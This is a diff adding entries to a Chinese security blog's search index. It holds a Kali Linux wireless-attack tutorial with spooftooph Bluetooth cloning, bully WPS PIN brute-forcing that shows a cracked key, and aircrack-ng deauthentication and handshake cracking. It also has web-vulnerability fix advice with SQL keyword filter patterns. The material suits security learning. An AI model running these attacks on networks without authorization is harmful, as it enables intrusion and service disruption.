@@ -1,6 +1,249 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Kali-Linux-Tools-无线攻击-(1)</title>
+    <url>/2023/11/20/6-Kl-tool/</url>
+    <content><![CDATA[<h2 id="Kali-无线攻击介绍"><a href="#Kali-无线攻击介绍" class="headerlink" title="Kali-无线攻击介绍"></a>Kali-无线攻击介绍</h2><p>Kali Linux 攻击分类包含了信息搜集、漏洞分析、Web程序、数据库评估软件、密码攻击、无线攻击、逆向工程、漏洞利用工具集、嗅探&#x2F;欺骗、权限维持、数字取证、报告工具集、Social Engineering Tools(社会工程工具)。一共十三项，本章介绍的是Kali中的无线攻击内容，主要分为蓝牙工具集和无线工具集。</p>
+<h2 id="Kali-linux-8821cu-无线网卡安装"><a href="#Kali-linux-8821cu-无线网卡安装" class="headerlink" title="Kali-linux 8821cu-无线网卡安装"></a>Kali-linux 8821cu-无线网卡安装</h2><p>首先查看usb接口</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ lsusb</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/14-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>命令刷新软件源缓存</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ apt update</span><br></pre></td></tr></table></figure></div>
+
+<p>之后更新内核</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ apt   install    linux-image-amd64   -y   (64位系统执行这条)</span><br><span class="line">$ apt   install    linux-image-686-pae  -y  (32位系统执行这条）</span><br></pre></td></tr></table></figure></div>
+
+<p>更新内核后重启系统以加载新内核</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ reboot</span><br></pre></td></tr></table></figure></div>
+
+<p>安装内核的头文件</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo  apt   install  linux-headers-amd64    -y （64位系统执行这条)  </span><br><span class="line">$ sudo  apt   install  linux-headers-686-pae  -y  (32位系统执行这条)</span><br></pre></td></tr></table></figure></div>
+
+<p>安装相关编译工具</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ apt   install    build-essential  bc  dkms  git  libelf-dev  -y</span><br></pre></td></tr></table></figure></div>
+
+<p>之后将github上的驱动源头</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/morrownr/8821cu-20210916</span><br></pre></td></tr></table></figure></div>
+
+<p>进入驱动模块目录并安装驱动</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> 8821cu-20210916</span><br><span class="line">$ ./install-driver.sh</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/15-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>最后结果显示</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/16-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<h2 id="蓝牙工具集"><a href="#蓝牙工具集" class="headerlink" title="蓝牙工具集"></a>蓝牙工具集</h2><h3 id="spooftooph-蓝牙设备伪造克隆工具"><a href="#spooftooph-蓝牙设备伪造克隆工具" class="headerlink" title="spooftooph-蓝牙设备伪造克隆工具"></a>spooftooph-蓝牙设备伪造克隆工具</h3><p>克隆并记录蓝牙设计信息生成随机的新蓝牙配置文件，每隔X秒更改蓝牙配置文件指定蓝牙接口的设备信息从扫码日志中选择要克隆的设备.<br>PS:要修改蓝牙适配器，必须以root权限运行spooftooth.<br>Spooftooph提供五种使用模式：</p>
+<p>1、指定NAME，CLASS和ADDR。<br>root @ test：spooftooph -i hci0 -n new_name -a 00：11：22：33：44：55 -c 0x1c010c</p>
+<p>2、随机生成NAME，CLASS和ADDR。<br>root @ test：spooftooph -i hci0 -R</p>
+<p>3、扫描范围内的设备并选择要克隆的设备。（可选）将设备信息转储到指定的日志文件中。<br>root @ test：spooftooph -i hci0 -s -w file.csv</p>
+<p>4、从日志文件加载设备信息并指定要克隆的设备信息。<br>root @ test：spooftooph -i hci0 -r file.csv</p>
+<p>5、每隔x秒在范围内克隆随机设备信息。<br>root @ test：spooftooph -i hci0 -t 10</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ spooftooph -i dev [-mstu] [-nac] | [-R] | [-r file] [-w file] </span><br><span class="line"><span class="comment"># -a &lt;address&gt;：指定新的BD_ADDR </span></span><br><span class="line"><span class="comment"># -b &lt;num_lines&gt;：每个要显示的蓝牙配置文件数页面</span></span><br><span class="line"><span class="comment"># -B：对于较小的屏幕禁用横幅（如手机）</span></span><br><span class="line"><span class="comment"># -c &lt;类&gt;：指定新类</span></span><br><span class="line"><span class="comment"># -h：帮助</span></span><br><span class="line"><span class="comment"># -i &lt;开发&gt;：指定接口</span></span><br><span class="line"><span class="comment"># -m：选择在指定多个接口</span></span><br><span class="line"><span class="comment"># -n &lt;名&gt;：指定新名称</span></span><br><span class="line"><span class="comment"># -r &lt;文件&gt;：读入CSV日志文件</span></span><br><span class="line"><span class="comment"># -R：分配随机名称，CLASS和ADDR </span></span><br><span class="line"><span class="comment"># -s：扫描本地区域中的设备</span></span><br><span class="line"><span class="comment"># -t &lt;时间&gt;：克隆设备的时间间隔</span></span><br><span class="line"><span class="comment"># -u：USB延迟。用于重新初始化接口</span></span><br><span class="line"><span class="comment"># -w &lt;file&gt;的交互式延迟：写入CSV日志文件（在必须通过USB时在虚拟化环境中有用。）</span></span><br></pre></td></tr></table></figure></div>
+
+<p>常见使用方式</p>
+<p>1.指定名称、类别和地址</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ spooftooph -i hci0 -n new_name -a 00:11:22:33:44:55 -c 0x1c010c</span><br></pre></td></tr></table></figure></div>
+<p>PS:这里，-a用于指定新地址 -c用于指定新类。</p>
+<p>2.创建一个随机的蓝牙配置文件<br>使用-R参数来分配随机名称、类和地址</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ spooftooph -R</span><br></pre></td></tr></table></figure></div>
+
+
+<p>3.扫码蓝牙设备<br>使用欺骗，我们还可以扫码范围内的设备并选择要克隆的设备<br>-s 参数用于扫码本地区域的设备<br>-w 将用于设备信息的保存在日志文件中</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ spooftooph -i hci0 -s -w file.csv</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/00-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/01-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>在上述example中附件没有蓝牙设备。但是，当运行该命令时，附近的蓝牙设备会出现</p>
+<p>4.从日志文件中克隆设备信息</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ spooftooph -i hci0 -r file.csv</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/02-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/03-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>5.每X秒更改一次蓝牙配置文件<br>指定的时间间隔内更改蓝牙的配置文件或设备信息，使用-t参数运行下列命令：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ spooftooph -i hci0 -t 10</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/04-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>推荐：⭐⭐ 不是非常推荐</p>
+<h2 id="无线工具集"><a href="#无线工具集" class="headerlink" title="无线工具集"></a>无线工具集</h2><h3 id="bully"><a href="#bully" class="headerlink" title="bully"></a>bully</h3><p>描述:是 WPS 穷举法的一个新实现，用 c 语言编写。它在概念上与其他程序相同，因为它利用了 WPS 规范中的(现在众所周知的)设计缺陷。与原始的reaver 代码相比，它有几个优点。其中包括减少依赖项、改进内存和 cpu 性能、正确处理 endianness 以及更健壮的选项集。它运行在 Linux 上，并且是专门为在嵌入式 Linux 系统(OpenWrt 等)上运行而开发的，无论其体系结构如何。<br>必需参数：<br>-b,–bssid macaddr 目标接入点的MAC地址<br>-e,–essid string 接入点的扩展SSID<br>可选参数：<br>-c,–channel N[,N…]AP的信道号或要跳的列表[b &#x2F;g]<br>-i,–index N 启动pin索引（7或8位数字）[自动]<br>-l,–lockwait N 如果AP锁定WPS，则要等待的秒数[43]<br>-o,–outfile file 消息输出文件<br>-p,–pin N 启动pin号(7位或8位)[自动]<br>-s,–source macaddr 源(硬件)MAC地址[探针]<br>-u,–luaLua脚本文件</p>
+<p>在kali下进行的操作<br>首先先确认我们的无线连接及其名称：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ iwconfig</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/18-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>设置你的无线网卡为监听模式<br>也就是有线连接上的混杂模式类似。它能够让我们看到所有广播传递到我们的无线网卡的数据报。<br>我们可以使用工具 Airmon-ng来完成这个任务。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ airmon-ng start wlan0</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/17-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>接下来，我们需要使用Airodump-ng 来查看我们周围的无线AP信息</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ airodump-ng [wifi 网卡的名称]</span><br></pre></td></tr></table></figure></div>
+<p>这样我们就可以看到几个AP </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/19-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>然后将上述步骤内容中查看到的相关信息，填入我们的Bully命令中</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ bully mon0 -b 00:25:9C:97:4F:48 -e Mandela2 -c 9</span><br></pre></td></tr></table></figure></div>
+<p>分解命令<br>mon0： 监听模式下无线网卡名<br>-b： 00:25:9C:97:4F:48<br>-e：Mandela2 AP SSID<br>-c：9是P正在广播的信道</p>
+<p>这些信息都可以在Airodump-ng的界面上找到</p>
+<p>其中，用于实施WPS认证破解的语法格式如下：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ bully --bssid [AP的MAC地址] -c [channel] [interface] -vv</span><br></pre></td></tr></table></figure></div>
+<p>-interface：指定监听的无线网络接口</p>
+<p>-b，–bssid：指定目标AP的MAC地址。</p>
+<p>-c，–channel：指定目标AP工作的信道。</p>
+<p>-vv：显示更详细的信息。</p>
+<p>使用Bully工具破解WPS加密。执行命令如下：</p>
+<div class="note-large red"><div class="notel-title"><p>Bully攻击流程-1</p>
+</div><div class="notel-content"><p>root@daxueba:~#  bully –bssid 14:e6:e4:84:23:7a wlan0mon -c 1<br>[!] Bully v1.1 - WPS vulnerability assessment utility<br>[P] Modified for pixiewps by AAnarchYY(<a class="link"   href="mailto:&#x61;&#x61;&#x6e;&#x61;&#x72;&#x63;&#x68;&#x79;&#x79;&#64;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;" >&#x61;&#x61;&#x6e;&#x61;&#x72;&#x63;&#x68;&#x79;&#x79;&#64;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br>[+] Switching interface ‘wlan0mon’ to channel ‘1’<br>[!] Using ‘00:0f:00:8d:a6:e2’ for the source MAC address<br>[+] Datalink type set to ‘127’, radiotap headers present<br>[+] Scanning for beacon from ‘14:e6:e4:84:23:7a’ on channel ‘1’<br>[!] Excessive (3) FCS failures while reading next packet<br>[!] Excessive (3) FCS failures while reading next packet<br>[!] Excessive (3) FCS failures while reading next packet<br>[!] Disabling FCS validation (assuming –nofcs)<br>[+] Got beacon for ‘Test’ (14:e6:e4:84:23:7a)<br>[!] Creating new randomized pin file ‘&#x2F;root&#x2F;.bully&#x2F;pins’<br>[+] Index of starting pin number is ‘0000000’<br>[+] Last State &#x3D; ‘NoAssoc’   Next pin ‘97011347’<br>[!] Received disassociation&#x2F;deauthentication from the AP<br>[+] Rx(M2D&#x2F;M3) &#x3D; ‘NoAssoc’   Next pin ‘97011347’<br>[!] Unexpected packet received when waiting for EAP Req Id<br>[!] &gt;000012002e48000000026c09a000e301000008023a01000f008da6e214e6e48423<br>7a14e6e484237a2000aaaa03000000888e0200008001de0080fe00372a000000010400104a0001101022000107103900107e4f501a655e05fb5360a4a9dcbb71e710140020d60dd09ac834bc24853d62c2603764d495c5922910f1bffe61ad9ba89625295910150020977b1c91a3df55b132817cc9d22e8196e361b6b179ee0fa41124897b2a7667b710050008acd9d60ed01a2236&lt;<br>[+] Rx(  ID  ) &#x3D; ‘EAPFail’   Next pin ‘97011347’<br>[!] Received disassociation&#x2F;deauthentication from the AP<br>[+] Rx( Assn ) &#x3D; ‘NoAssoc’   Next pin ‘97011347’</p>
+</div></div>
+
+<p>从输出的信息可以看到，正在尝试暴力破解目标AP的PIN码，当破解成功后，将显示如下类似的信息：</p>
+<div class="note-large red"><div class="notel-title"><p>Bully攻击流程-2</p>
+</div><div class="notel-content"><p>[+] Rx(  ID  ) &#x3D; ‘EAPFail’   Next pin ‘98874019’<br>[+] Rx( Assn ) &#x3D; ‘Timeout’   Next pin ‘98874019’<br>[+] Rx(M2D&#x2F;M3) &#x3D; ‘Timeout’   Next pin ‘98874019’<br>[!] Unexpected packet received when waiting for EAP Req Id<br>[!] &gt;00001a002f48000036164fc40500000010028509a000f001000008023a0100e04c<br>81c11014e6e484237a14e6e484237a2000aaaa03000000888e0200008001c80080fe00372a000000010400104a00011010220001071039001078c42434621449aa65f773b8fe1dea5d101400202eea8e7be64d88e401dfa116452edf8427aeb7985af884bd699a5fa0761759c110150020e2ef0681fab497cbb0ca37ca127af08a15c025100757a64cb73fd46c01976913100500081adaf460796cfd38352c6570&lt;<br>[+] Rx(  ID  ) &#x3D; ‘EAPFail’   Next pin ‘98874019’<br>[*] Pin is ‘98874019’, key is ‘daxueba!’<br>Saved session to ‘&#x2F;root&#x2F;.bully&#x2F;14e6e484237a.run’<br>        PIN : ‘98874019’<br>        KEY : ‘daxueba!’</p>
+</div></div>
+
+<p>以上输出信息中可以看到破解出了Test的密码，其中，PIN码为98870419，密钥为daxueba!</p>
+<p>PS：<br>Bully会在3到5个小时内破解出WPS PIN和AP密码。</p>
+<p>推荐：⭐⭐ 不是非常推荐</p>
+<h2 id="蓝牙-无线攻击工具"><a href="#蓝牙-无线攻击工具" class="headerlink" title="蓝牙&amp;&amp;无线攻击工具"></a>蓝牙&amp;&amp;无线攻击工具</h2><h3 id="aircrack-ng"><a href="#aircrack-ng" class="headerlink" title="aircrack-ng"></a>aircrack-ng</h3><p>Aircrack-ng是一款用于无线网络渗透测试的工具，它可以扫描无线网络、捕获数据包、破解密码等。</p>
+<p>个人实验成功的攻击为WAP加密</p>
+<p>首先将无线网卡插入电脑并选择连接虚拟机中的kali</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/05-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>之后输入命令</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ iwconfig</span><br></pre></td></tr></table></figure></div>
+<p>查看无线网卡有没有加载成功，发现存在无线网卡wlan0，目前wlan0没有连接到任何的wifi上，这个Wlan0中没有IP地址就说明它现在不在连接中。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/06-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>激活无线网卡至monitor既监听模式</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">airmon-ng start wlan0    </span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/07-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>获取当前网络概况:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0    </span><br></pre></td></tr></table></figure></div>
+<p>其中 wlan0 是监听模式的接口名称</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/08-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>如果说后续不成功建议使用命令</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng check <span class="built_in">kill</span> </span><br></pre></td></tr></table></figure></div>
+<p>删除多余不必要的内容</p>
+<p>airodump-nq命令详解：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ BSSID显示目标网络的MAC地址</span><br><span class="line">$ PWR显示网络的信号强度。数字越高，信号越好</span><br><span class="line">$ Beacons是网络发送的帧，以便广播它的存在</span><br><span class="line">$ <span class="comment">#Data表示数据包的数量或数据帧的数量</span></span><br><span class="line">$ <span class="comment">#/s显示在过去10秒内收集的数据包的数量</span></span><br><span class="line">$ CH显示网络工作的频道</span><br><span class="line">$ ENC显示网络使用的加密。它可以是WEP，OPN，WPA，WPA2CIPHER显示网络中使用的密码</span><br><span class="line">$ AUTH显示网络上使用的身份验证</span><br><span class="line">$ ESSID显示网络的名称</span><br></pre></td></tr></table></figure></div>
+<p>选择目标网络并进行记录信息<br>例如：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/09-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>其中记录其MAC地址以及信道号<br>MAC地址：BSSID: 80:EA:07:A5:09:FF<br>工作信道:CH:11</p>
+<p>启动数据包捕获</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon</span><br></pre></td></tr></table></figure></div>
+<p>其中“[channel]”是目标网络的信道号，“[BSSID]”是目标网络的MAC地址，“capture”是保存捕获数据包的文件名，这个可以进行修改。</p>
+<p>使用以下命令对目标网络进行攻击</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">aireplay-ng -0 10 -a [BSSID] wlan0mon</span><br></pre></td></tr></table></figure></div>
+<p>其中，“-0”表示进行Deauthentication攻击，“10”表示发送10个Deauthentication帧，“[BSSID]”是目标网络的MAC地址。</p>
+<p>-0为模式中的一种：冲突攻击模式，后面跟发送次数（设置为0，则为循环攻击，不停的断开连接，客户端无法正常上网，-a 指定无线AP的mac地址，即为该无线网的bssid值</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/10-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>在右上角可以看到WPA handshake字样，后面跟着bssid，即为抓到了该无线网的握手包，我们可以使用CTRL+C来停止嗅探握手包。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/11-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>等待一段时间后，Aircrack-ng将会捕获足够的数据包以进行密码破解。</p>
+<p>使用密码本进行密码破解</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w [dictionary-file] capture-01.cap</span><br></pre></td></tr></table></figure></div>
+<p>其中，“[dictionary-file]”是用于破解密码的字典文件名，“capture-01.cap”是捕获的数据包文件名。<br>之后等待结果</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/12-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/13-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>推荐：⭐⭐ 不是非常推荐</p>
+<h2 id="总推荐指数"><a href="#总推荐指数" class="headerlink" title="总推荐指数"></a>总推荐指数</h2><p>推荐：⭐  不推荐</p>
+]]></content>
+      <categories>
+        <category>Kali-linux</category>
+      </categories>
+      <tags>
+        <tag>Kali-Attack</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>等保工具相关使用</title>
     <url>/2023/09/26/DB-tool/</url>
     <content><![CDATA[<h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><p>主机存活探测、漏洞扫描、子域名扫描、端口扫描、各类服务数据库爆破、poc扫描、xss扫描、webtitle探测、web指纹识别、web敏感信息泄露、web目录浏览、web文件下载、等保安全风险问题风险自查等； 弱口令&#x2F;未授权访问：40余种； WEB组件识别：300余种； 漏洞扫描：XSS、任意文件访问、任意命令执行、敏感信息泄露、默认账户密码…； 资产扫描：扫描存活主机-&gt;判断存活端口-&gt;识别协议&#x2F;组件-&gt;基于组件协议进行弱口令、漏洞扫描-&gt;输出报告</p>
@@ -35,6 +278,181 @@
       </categories>
       <tags>
         <tag>等保</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web常见漏洞描述及修复建议</title>
+    <url>/2024/01/04/LD-BugFixes/</url>
+    <content><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入漏洞描述"><a href="#SQL注入漏洞描述" class="headerlink" title="SQL注入漏洞描述"></a>SQL注入漏洞描述</h3><p>　　Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p>
+<h3 id="SQL注入修复建议"><a href="#SQL注入修复建议" class="headerlink" title="SQL注入修复建议"></a>SQL注入修复建议</h3><p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p>
+<p>　　（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>
+<p>　　（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</p>
+<p>　　（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p>
+<p>　　（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p>
+<p>　　（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p>
+<p>　　（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p>
+<p>　　（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>
+<p>　　（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="XSS漏洞描述"><a href="#XSS漏洞描述" class="headerlink" title="XSS漏洞描述"></a>XSS漏洞描述</h3><p>　　1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML&#x2F;JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。<br>　　2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p>
+<h3 id="XSS攻击可导致以下危害："><a href="#XSS攻击可导致以下危害：" class="headerlink" title="XSS攻击可导致以下危害："></a>XSS攻击可导致以下危害：</h3><p>　　1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p>
+<p>　　2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p>
+<p>　　3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p>
+<p>　　4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p>
+<p>　　5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p>
+<p>　　6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p>
+<p>　　7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p>
+<h3 id="XSS修复建议"><a href="#XSS修复建议" class="headerlink" title="XSS修复建议"></a>XSS修复建议</h3><p>　　xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p>
+<p>　　（1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</p>
+<p>　　（2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。</p>
+<p>　　（3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p>
+<p>　　（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</p>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="XXE漏洞描述"><a href="#XXE漏洞描述" class="headerlink" title="XXE漏洞描述"></a>XXE漏洞描述</h3><p>参考：<a class="link"   href="https://www.freebuf.com/company-information/165769.html" >https://www.freebuf.com/company-information/165769.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="CSRF漏洞描述"><a href="#CSRF漏洞描述" class="headerlink" title="CSRF漏洞描述"></a>CSRF漏洞描述</h3><p>　　CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p>
+<h3 id="CSRF漏洞修复建议"><a href="#CSRF漏洞修复建议" class="headerlink" title="CSRF漏洞修复建议"></a>CSRF漏洞修复建议</h3><p>　　1、验证请求的Referer是否来自本网站，但可被绕过。</p>
+<p>　　2、在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。</p>
